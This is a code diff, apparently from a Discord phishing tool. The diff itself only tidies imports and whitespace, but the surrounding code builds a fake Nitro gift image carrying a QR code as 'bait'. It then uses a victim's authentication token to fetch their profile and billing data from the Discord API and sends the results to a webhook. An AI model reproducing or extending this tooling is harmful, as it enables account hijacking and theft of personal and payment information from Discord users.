@@ -14,15 +14,10 @@ the-cult-of-integral
 mte0
 """
 
-import base64
-import ctypes
-import os
-import re
-import time
+import base64, ctypes, os, re, time
 from io import BytesIO
 from tempfile import NamedTemporaryFile, TemporaryDirectory
 from threading import Thread
-
 from bs4 import BeautifulSoup
 from discord_webhook import DiscordEmbed, DiscordWebhook
 from PIL import Image
@@ -35,13 +30,11 @@ from selenium.webdriver.chrome.service import Service
 from selenium.webdriver.common.by import By
 from selenium.webdriver.support import expected_conditions as EC
 from selenium.webdriver.support.ui import WebDriverWait
-
 from utilities import banner, pystray_img
 
 YES = 'y'
 NO = 'n'
 SLEEP_TIME = 3
-
 
 def generate_qr_code(path_1: str, path_2: str) -> None:
     """Generates a QR code using the files in the resources directory.
@@ -52,7 +45,6 @@ def generate_qr_code(path_1: str, path_2: str) -> None:
     qr_img.paste(ovly_img, (60, 55))
     qr_img.save(path_2, quality=95)
 
-
 def generate_nitro_template(path_2: str) -> None:
     """Generates a Discord Nitro template using the files in the resources directory.
     \nThis template will be used to form a full bait image after a QR code pasted on it.
@@ -60,7 +52,6 @@ def generate_nitro_template(path_2: str) -> None:
     nitro_template = Image.open(os.path.join(os.getcwd(), 'resources', 'template.png'), 'r')
     nitro_template.paste(Image.open(path_2, 'r'), (120, 409))
     nitro_template.save('discord_gift.png', quality=95)
-
 
 def get_user_std_data(token: str) -> list | None:
     """Gets a user's standard data from the Discord API via their authentication token.
@@ -72,7 +63,6 @@ def get_user_std_data(token: str) -> list | None:
     except:
         return None
 
-
 def get_user_billing_data(token: str, link_int: int) -> dict:
     """Gets a user's billing data from the Discord API via their authentication token.
     """
@@ -82,7 +72,6 @@ def get_user_billing_data(token: str, link_int: int) -> dict:
     elif link_int == 2:
         response_json = get('https://discordapp.com/api/v9/users/@me/billing/subscriptions',  headers=headers).json()
     return response_json
-
 
 def main(webhook_url: str) -> None:
     """The main function of the program.
@@ -196,7 +185,6 @@ def main(webhook_url: str) -> None:
         webhook.execute()
         
     Write.Input('\n\n[*] Press ENTER to quit.', Colors.blue_to_green)
-
 
 if __name__ == "__main__":
     
